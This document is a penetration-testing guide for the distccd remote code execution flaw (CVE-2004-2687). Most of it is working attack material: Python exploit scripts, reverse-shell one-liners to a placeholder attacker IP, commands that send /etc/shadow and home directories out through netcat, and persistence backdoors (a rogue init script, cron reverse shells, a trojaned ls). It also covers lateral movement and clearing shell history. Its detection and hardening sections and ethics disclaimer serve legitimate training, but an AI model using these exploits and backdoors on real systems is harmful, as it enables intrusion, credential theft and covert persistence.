# 🔐 distccd (Port 3632) - Exploitation Guide

## 🎯 Vulnerability Overview

**Service:** distccd (Distributed C/C++ Compiler Daemon)  
**Port:** 3632/tcp  
**Vulnerability Type:** Remote Code Execution  
**Severity:** Critical (CVSS 9.3)  
**CVE:** CVE-2004-2687

### Description
distccd is part of the distcc distributed compilation system. The daemon allows remote code execution without authentication when it accepts compilation requests. Attackers can inject arbitrary commands into the compilation process, leading to complete system compromise.

---

## 🔍 Reconnaissance Workflow

### Step 1: Service Detection

#### Port Scanning
```bash
# Quick distccd port scan
nmap -p 3632 <target-ip>

# Service version detection
nmap -sV -p 3632 <target-ip>

# Comprehensive enumeration
nmap -sV -sC -p 3632 --script distcc-* <target-ip>
```

#### Banner Grabbing
```bash
# Direct connection to distccd
nc <target-ip> 3632

# Using telnet
telnet <target-ip> 3632

# distcc client test
echo | distcc <target-ip> --help 2>/dev/null
```

#### Service Verification
```bash
# Test if distccd is responding
echo "DIST 1" | nc <target-ip> 3632

# Check distcc protocol version
echo "DIST 1" | nc -w 5 <target-ip> 3632

# Using nmap script for detailed info
nmap --script distcc-cve2004-2687 -p 3632 <target-ip>
```

### Step 2: distcc Configuration Analysis

#### Protocol Understanding
```bash
# distcc protocol basics:
# DIST <version> - Initialize connection
# ARGC <n> - Number of arguments
# ARGV<n> <arg> - Individual arguments
# DOTI - Start of input
# DONE - End of compilation job
```

#### Test Compilation Request
```bash
# Basic compilation test
cat > test.c << 'EOF'
int main() { return 0; }
EOF

# Send to distccd (if working normally)
distcc -j1 <target-ip> gcc test.c -o test
```

---

## 💥 Exploitation Workflow

### Method 1: Metasploit Exploitation

#### Basic Metasploit Usage
```bash
# Start Metasploit
msfconsole

# Use distccd exploit module
use exploit/unix/misc/distcc_exec

# Show options
show options

# Set required parameters
set RHOSTS <target-ip>
set LHOST <your-ip>
set LPORT 4444

# Optional payload selection
set PAYLOAD cmd/unix/reverse_netcat

# Check if target is vulnerable
check

# Execute exploit
exploit
```

#### Advanced Metasploit Configuration
```bash
# Different payload options
set PAYLOAD cmd/unix/bind_netcat
set PAYLOAD cmd/unix/reverse_bash
set PAYLOAD cmd/unix/reverse_python

# Custom command execution
set PAYLOAD cmd/unix/generic
set CMD "id; whoami; uname -a"

# Run with verbose output
set VERBOSE true
exploit
```

### Method 2: Manual Exploitation

#### Direct Command Injection
```bash
# Basic command injection via compilation flags
# The vulnerability lies in the argument parsing

# Set up listener
nc -lvnp 4444

# Send malicious compilation request
cat > exploit.py << 'EOF'
#!/usr/bin/env python3
import socket
import sys

def exploit_distcc(target_ip, command):
    try:
        # Connect to distccd
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target_ip, 3632))
        
        # Send distcc protocol header
        sock.send(b"DIST 1\n")
        
        # Receive response
        response = sock.recv(1024)
        print(f"Server response: {response.decode().strip()}")
        
        # Send malicious compilation request
        # Inject command through compiler arguments
        malicious_arg = f";{command};"
        
        # Build distcc request
        request = f"ARGC 7\nARGV0 gcc\nARGV1 -c\nARGV2 -o\nARGV3 /tmp/test.o\nARGV4 {malicious_arg}\nARGV5 /tmp/test.c\nARGV6 -\n"
        
        sock.send(request.encode())
        
        # Send dummy source code
        sock.send(b"DOTI\nint main(){return 0;}\nDONE\n")
        
        # Receive response
        response = sock.recv(1024)
        print(f"Compilation response: {response.decode()}")
        
        sock.close()
        
    except Exception as e:
        print(f"Exploitation failed: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 distcc_exploit.py <target-ip> '<command>'")
        print("Example: python3 distcc_exploit.py 192.168.1.10 'nc 192.168.1.5 4444 -e /bin/bash'")
        sys.exit(1)
    
    target = sys.argv[1]
    command = sys.argv[2]
    
    print(f"Exploiting distccd on {target}")
    print(f"Command: {command}")
    exploit_distcc(target, command)
EOF

python3 exploit.py <target-ip> 'nc <your-ip> 4444 -e /bin/bash'
```

#### Alternative Manual Method
```bash
# Using netcat to send raw distcc protocol
{
    echo "DIST 1"
    echo "ARGC 4" 
    echo "ARGV0 sh"
    echo "ARGV1 -c"
    echo "ARGV2 nc <your-ip> 4444 -e /bin/bash"
    echo "ARGV3 ;"
    echo "DOTI"
    echo "DONE"
} | nc <target-ip> 3632
```

### Method 3: Advanced Command Injection

#### Reverse Shell Payloads
```bash
# Bash reverse shell
python3 exploit.py <target-ip> '/bin/bash -i >& /dev/tcp/<your-ip>/4444 0>&1'

# Python reverse shell
python3 exploit.py <target-ip> 'python -c "import socket,subprocess,os;s=socket.socket();s.connect((\"<your-ip>\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])"'

# Perl reverse shell
python3 exploit.py <target-ip> 'perl -e "use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in(4444,inet_aton(\"<your-ip>\")));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");"'

# Netcat variations
python3 exploit.py <target-ip> 'nc -e /bin/bash <your-ip> 4444'
python3 exploit.py <target-ip> 'nc <your-ip> 4444 -e /bin/sh'
python3 exploit.py <target-ip> 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your-ip> 4444 >/tmp/f'
```

#### Data Exfiltration Commands
```bash
# System information gathering
python3 exploit.py <target-ip> 'id > /tmp/distcc_info.txt'
python3 exploit.py <target-ip> 'uname -a >> /tmp/distcc_info.txt'
python3 exploit.py <target-ip> 'cat /etc/passwd >> /tmp/distcc_info.txt'

# File exfiltration
python3 exploit.py <target-ip> 'cat /etc/shadow | base64 | nc <your-ip> 9999'
python3 exploit.py <target-ip> 'tar czf - /etc /home | nc <your-ip> 8888'
```

### Method 4: Scripted Automation

#### Comprehensive Exploitation Script
```python
#!/usr/bin/env python3
import socket
import sys
import time
import threading

class DistccExploit:
    def __init__(self, target_ip, target_port=3632):
        self.target_ip = target_ip
        self.target_port = target_port
        
    def send_command(self, command):
        """Send command via distcc vulnerability"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((self.target_ip, self.target_port))
            
            # Send protocol initialization
            sock.send(b"DIST 1\n")
            response = sock.recv(1024)
            
            if b"DIST" not in response:
                print("[-] Invalid distcc response")
                return False
            
            # Craft malicious request
            request = (
                "ARGC 6\n"
                "ARGV0 sh\n" 
                "ARGV1 -c\n"
                f"ARGV2 {command}\n"
                "ARGV3 #\n"
                "ARGV4 -c\n"
                "ARGV5 main.c\n"
                "DOTI\n"
                "int main(){return 0;}\n"
                "DONE\n"
            )
            
            sock.send(request.encode())
            response = sock.recv(1024)
            
            sock.close()
            return True
            
        except Exception as e:
            print(f"[-] Exploitation failed: {e}")
            return False
    
    def get_reverse_shell(self, lhost, lport):
        """Get reverse shell"""
        command = f"/bin/bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        return self.send_command(command)
    
    def execute_command(self, command):
        """Execute single command"""
        return self.send_command(command)
    
    def upload_file(self, local_file, remote_path):
        """Upload file to target"""
        try:
            with open(local_file, 'rb') as f:
                content = f.read()
                
            # Base64 encode for safe transmission
            import base64
            encoded = base64.b64encode(content).decode()
            
            command = f"echo '{encoded}' | base64 -d > {remote_path}"
            return self.send_command(command)
            
        except Exception as e:
            print(f"[-] File upload failed: {e}")
            return False

def main():
    if len(sys.argv) < 3:
        print("Usage: python3 distcc_advanced.py <target-ip> <action> [options]")
        print("Actions:")
        print("  cmd '<command>'          - Execute single command")
        print("  shell <lhost> <lport>    - Get reverse shell") 
        print("  upload <local> <remote>  - Upload file")
        print("  enum                     - Enumerate system")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    action = sys.argv[2]
    
    exploit = DistccExploit(target_ip)
    
    if action == "cmd" and len(sys.argv) >= 4:
        command = sys.argv[3]
        print(f"[+] Executing: {command}")
        exploit.execute_command(command)
        
    elif action == "shell" and len(sys.argv) >= 5:
        lhost = sys.argv[3]
        lport = sys.argv[4]
        print(f"[+] Getting reverse shell to {lhost}:{lport}")
        exploit.get_reverse_shell(lhost, lport)
        
    elif action == "enum":
        print("[+] Enumerating system...")
        commands = [
            "id",
            "uname -a", 
            "cat /etc/passwd",
            "ps aux",
            "netstat -tlpn"
        ]
        
        for cmd in commands:
            print(f"[+] Running: {cmd}")
            exploit.send_command(f"{cmd} > /tmp/enum_{cmd.replace(' ', '_')}.txt")
            time.sleep(1)
        
        print("[+] Results saved to /tmp/enum_*.txt on target")
        
    else:
        print("[-] Invalid action or missing parameters")

if __name__ == "__main__":
    main()
```

---

## ✅ Post-Exploitation Activities

### Initial System Assessment
```bash
# Verify shell access
id
whoami
groups

# System information
uname -a
hostname
cat /etc/*release*

# Network configuration
ifconfig -a
ip addr show
netstat -rn
```

### distcc Service Analysis
```bash
# Check distcc configuration
ps aux | grep distcc
ls -la /usr/bin/distcc*
ls -la /etc/distcc/

# distcc environment variables
env | grep -i distcc

# Check distcc hosts file
cat /etc/distcc/hosts 2>/dev/null
cat ~/.distcc/hosts 2>/dev/null

# distcc logs
tail -50 /var/log/distcc.log 2>/dev/null
journalctl -u distcc 2>/dev/null
```

### Compilation Environment Analysis
```bash
# Check available compilers
which gcc g++ clang
gcc --version
g++ --version

# Development tools
dpkg -l | grep -E "(gcc|build|dev)" | head -20
yum list installed | grep -E "(gcc|devel)" | head -20

# Include paths and libraries
gcc -v 2>&1 | grep -A 20 "COLLECT_GCC_OPTIONS"
ldconfig -p | head -20
```

### User and Permission Analysis
```bash
# Current user context
id
groups
sudo -l

# distcc user analysis
cat /etc/passwd | grep distcc
ps aux | grep distcc | grep -v grep

# File permissions
find / -user distcc 2>/dev/null | head -20
find / -group distcc 2>/dev/null | head -20
```

### Network Services Assessment
```bash
# Open ports and services
netstat -tulpn
ss -tulpn

# distcc specific network info
netstat -an | grep 3632
lsof -i :3632

# Network connections
netstat -an | grep ESTABLISHED
ss -t state established
```

### File System Exploration
```bash
# Home directories
ls -la /home/
ls -la /root/ 2>/dev/null

# Temporary directories
ls -la /tmp/
ls -la /var/tmp/

# Look for source code and projects
find / -name "*.c" -o -name "*.cpp" -o -name "*.h" 2>/dev/null | head -20
find / -name "Makefile" -o -name "*.pro" 2>/dev/null | head -10

# Configuration files
find /etc -name "*.conf" 2>/dev/null | grep -v "/etc/ssl" | head -20
```

---

## 🔧 Advanced Exploitation Techniques

### Persistence Mechanisms

#### Service-Level Persistence
```bash
# Modify distcc service to include backdoor
# Create persistent distcc configuration
cat > /tmp/distcc_backdoor.sh << 'EOF'
#!/bin/bash
# Start normal distccd service
/usr/bin/distccd --daemon --allow 0.0.0.0/0 &

# Start backdoor listener
while true; do
    nc -l -p 5555 -e /bin/bash
    sleep 5
done &
EOF

# Install as service startup script
cp /tmp/distcc_backdoor.sh /etc/init.d/distcc-enhanced
chmod +x /etc/init.d/distcc-enhanced
update-rc.d distcc-enhanced defaults  # Debian/Ubuntu
chkconfig distcc-enhanced on           # RedHat/CentOS
```

#### Cron Job Persistence
```bash
# Add reverse shell cron job
echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/<your-ip>/4444 0>&1'" >> /etc/crontab

# User-specific cron job (if distcc user has cron access)
crontab -l 2>/dev/null > /tmp/current_cron
echo "*/10 * * * * nc <your-ip> 5555 -e /bin/bash" >> /tmp/current_cron
crontab /tmp/current_cron
```

#### Binary Replacement
```bash
# Replace legitimate binaries with backdoored versions
cp /bin/ls /tmp/ls_backup

# Create backdoored ls
cat > /tmp/backdoored_ls.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

int main(int argc, char *argv[]) {
    // Execute normal ls functionality
    system("/tmp/ls_backup");
    
    // Backdoor functionality (silent)
    if (getuid() == 0) {
        system("nc <your-ip> 6666 -e /bin/bash &");
    }
    
    return 0;
}
EOF

gcc /tmp/backdoored_ls.c -o /bin/ls
```

### Lateral Movement

#### Network Discovery
```bash
# Discover other hosts via distcc
cat /etc/distcc/hosts 2>/dev/null
cat ~/.distcc/hosts 2>/dev/null

# Scan for other distcc services
nmap -p 3632 192.168.1.0/24

# Test connectivity to discovered hosts
for host in $(cat /etc/distcc/hosts 2>/dev/null); do
    echo "Testing $host"
    nc -z -w 3 $host 3632 && echo "$host:3632 open"
done
```

#### Compilation-based Lateral Movement
```bash
# Use distcc to compile and execute on remote hosts
# Create malicious source file
cat > /tmp/lateral.c << 'EOF'
#include <stdlib.h>
int main() {
    system("nc <your-ip> 7777 -e /bin/bash");
    return 0;
}
EOF

# Compile on remote distcc hosts
distcc gcc /tmp/lateral.c -o /tmp/lateral

# If successful, the remote host will execute the payload
```

### Data Exfiltration

#### Source Code Exfiltration
```bash
# Find and compress source code
find / -name "*.c" -o -name "*.cpp" -o -name "*.h" 2>/dev/null | head -50 | xargs tar czf /tmp/source_code.tar.gz

# Exfiltrate via netcat
nc <your-ip> 8888 < /tmp/source_code.tar.gz

# Alternative: Base64 encoding for text-based channels
base64 -w 0 /tmp/source_code.tar.gz > /tmp/source_encoded.txt
```

#### Build Environment Exfiltration
```bash
# Export build configurations
find / -name "Makefile*" -o -name "*.mk" -o -name "configure.ac" 2>/dev/null | xargs tar czf /tmp/build_configs.tar.gz

# Export compiler and library information
gcc -v 2>&1 > /tmp/gcc_info.txt
ldconfig -p > /tmp/library_info.txt
pkg-config --list-all > /tmp/pkg_config.txt 2>/dev/null

# Package and exfiltrate
tar czf /tmp/build_env.tar.gz /tmp/gcc_info.txt /tmp/library_info.txt /tmp/pkg_config.txt
```

---

## 🔍 Detection and Forensics

### Log Analysis
```bash
# distcc daemon logs
tail -f /var/log/distccd.log
journalctl -u distcc -f

# System logs for distcc activity
grep -i distcc /var/log/syslog
grep -i distcc /var/log/messages

# Authentication logs
grep -i "3632" /var/log/auth.log
grep -i "compilation" /var/log/syslog
```

### Network Monitoring
```bash
# Monitor distcc network activity
netstat -an | grep 3632
lsof -i :3632

# Capture distcc traffic
tcpdump -i any port 3632 -A -w distcc_traffic.pcap

# Real-time monitoring
tcpdump -i any port 3632 -A

# Wireshark filter for distcc
# tcp.port == 3632
```

### Process Monitoring
```bash
# Monitor distcc processes
ps aux | grep distcc
pstree -p | grep distcc

# Monitor compilation processes
ps aux | grep gcc
ps aux | grep g++

# Check for unusual child processes
pgrep -P $(pgrep distccd) -l
```

### File System Forensics
```bash
# Check for recently compiled binaries
find /tmp -name "*.o" -o -name "*.so" -o -name "a.out" -newer /var/log/lastlog

# Look for suspicious source files
find / -name "*.c" -newer /var/log/lastlog 2>/dev/null
find /tmp -name "*.c" -ls

# Check distcc temporary files
ls -la /tmp/distcc*
ls -la /var/tmp/distcc*

# Examine compilation artifacts
file /tmp/*.o 2>/dev/null
file /tmp/a.out 2>/dev/null
```

---

## 🛡️ Security Hardening

### distcc Service Hardening

#### Secure Configuration
```bash
# Edit distcc configuration for security
# /etc/default/distcc or /etc/distcc/distccd
STARTDISTCC="false"  # Disable if not needed

# If distcc is required, restrict access
ALLOWEDNETS="192.168.1.0/24"  # Limit to trusted networks
LISTENER="192.168.1.100"      # Bind to specific IP
JOBS="4"                      # Limit concurrent jobs
```

#### Access Control
```bash
# Configure distcc with access restrictions
# Start distccd with restrictive options
distccd --daemon --allow 192.168.1.0/24 --listen 192.168.1.100 --jobs 4 --user distcc --group distcc

# Create hosts.allow/hosts.deny entries
echo "distcc: 192.168.1.0/24" >> /etc/hosts.allow
echo "distcc: ALL" >> /etc/hosts.deny
```

### Firewall Configuration
```bash
# Block distcc port externally
iptables -A INPUT -p tcp --dport 3632 -s 192.168.1.0/24 -j ACCEPT
iptables -A INPUT -p tcp --dport 3632 -j DROP

# UFW configuration
ufw allow from 192.168.1.0/24 to any port 3632
ufw deny 3632

# Save iptables rules
iptables-save > /etc/iptables/rules.v4
```

### Service Disabling
```bash
# Stop and disable distcc if not needed
systemctl stop distcc
systemctl disable distcc

# Remove distcc packages
apt remove distcc distcc-common     # Debian/Ubuntu
yum remove distcc                   # RedHat/CentOS

# Kill any running distccd processes
pkill -f distccd
```

### Monitoring Setup
```bash
# distcc monitoring script
cat > /usr/local/bin/distcc_monitor.sh << 'EOF'
#!/bin/bash
LOG_FILE="/var/log/distcc_security.log"

# Check for distcc processes
if pgrep -f distccd > /dev/null; then
    CONNECTIONS=$(netstat -an | grep :3632 | grep ESTABLISHED | wc -l)
    if [ $CONNECTIONS -gt 5 ]; then
        echo "$(date): ALERT - High number of distcc connections: $CONNECTIONS" >> $LOG_FILE
    fi
fi

# Check for suspicious compilation activity
RECENT_COMPILES=$(find /tmp -name "*.o" -newer /var/log/lastlog 2>/dev/null | wc -l)
if [ $RECENT_COMPILES -gt 10 ]; then
    echo "$(date): ALERT - Unusual compilation activity: $RECENT_COMPILES files" >> $LOG_FILE
fi

# Monitor for exploit attempts
if [ -f /var/log/distccd.log ]; then
    grep -i "error\|fail\|exploit" /var/log/distccd.log | tail -5 >> $LOG_FILE
fi
EOF

chmod +x /usr/local/bin/distcc_monitor.sh
echo "*/5 * * * * root /usr/local/bin/distcc_monitor.sh" >> /etc/crontab
```

---

## 🚨 Incident Response

### Immediate Response Actions
```bash
# Stop distcc service immediately
systemctl stop distcc
pkill -f distccd

# Block distcc port
iptables -I INPUT 1 -p tcp --dport 3632 -j DROP

# Kill any suspicious compilation processes
pkill gcc
pkill g++
pkill cc
```

### Damage Assessment
```bash
# Check for recent compilation activity
find / -name "*.o" -newer /var/log/lastlog 2>/dev/null
find /tmp -type f -executable -newer /var/log/lastlog

# Look for backdoors or malicious binaries
find /tmp -name "nc" -o -name "netcat" -o -name "*.elf"
file /tmp/* 2>/dev/null | grep executable

# Check system integrity
find /bin -newer /var/log/lastlog
find /usr/bin -newer /var/log/lastlog
find /sbin -newer /var/log/lastlog
```

### Recovery Actions
```bash
# Remove distcc entirely
apt purge distcc distcc-common
yum remove distcc

# Clean up compilation artifacts
rm -rf /tmp/*.o /tmp/a.out /tmp/distcc*
rm -rf /var/tmp/distcc*

# Restore system binaries from backup
# (if any were replaced)
dpkg --verify
rpm -Va

# Reset distcc user if it exists
userdel distcc
groupdel distcc
```

---

## 📚 References and Tools

### Essential Tools
- **Metasploit Framework:** exploit/unix/misc/distcc_exec
- **Nmap:** distcc-cve2004-2687.nse script
- **netcat:** Network utility for manual exploitation
- **distcc client:** For testing legitimate functionality

### distcc-Specific Nmap Scripts
```bash
# Available distcc scripts
ls /usr/share/nmap/scripts/ | grep distcc

# Key script:
distcc-cve2004-2687.nse  # Exploit CVE-2004-2687
```

### Online Resources
- **CVE-2004-2687:** https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2687
- **distcc Documentation:** https://distcc.github.io/
- **Exploit Database:** https://www.exploit-db.com/exploits/9915
- **distcc Security Advisory:** https://distcc.github.io/security.html

---

## ⚠️ Legal and Ethical Considerations

**WARNING:** This guide is for educational and authorized security testing purposes only.

### Important Guidelines:
- Always obtain proper written authorization before testing
- Only test systems you own or have explicit permission to test
- distcc exploitation can lead to immediate system compromise
- Document all activities for reporting purposes
- Follow responsible disclosure practices
- Comply with local laws and regulations

### Best Practices:
- Use isolated test environments when possible
- Avoid disrupting legitimate compilation processes
- Monitor system resources during testing
- Clean up any files or changes made during testing
- Report vulnerabilities through proper channels
- Consider business impact when testing development systems

### Cleanup Checklist:
```bash
# Remove exploit scripts and artifacts
rm -f /tmp/exploit.py
rm -f /tmp/distcc_exploit.py
rm -f /tmp/*.c /tmp/*.o /tmp/a.out

# Remove any backdoors installed
rm -f /tmp/backdoor* /tmp/shell*
rm -f /etc/init.d/distcc-enhanced

# Clear command history
history -c

# Restore original distcc configuration
cp /etc/default/distcc.backup /etc/default/distcc
```

---

*Last Updated: August 2025*  
*Version: 1.0*